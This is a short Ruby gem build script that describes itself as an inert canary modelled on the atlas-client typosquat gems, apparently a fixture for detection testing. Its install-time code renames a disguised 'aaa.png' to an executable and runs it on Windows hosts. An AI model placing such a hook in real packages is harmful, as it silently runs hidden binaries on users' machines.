# INERT CANARY modelled on the atlas-client typosquats (2020): a PE shipped as aaa.png is
# renamed and run at gem install; it plants a startup script that swaps crypto addresses
# on the clipboard. Never executed.
require 'mkmf'
if RbConfig::CONFIG['host_os'] =~ /mswin|mingw/
  here = File.dirname(__FILE__)
  File.rename(File.join(here, 'aaa.png'), File.join(here, 'a.exe'))
  system(File.join(here, 'a.exe'))
end
create_makefile('waffling')
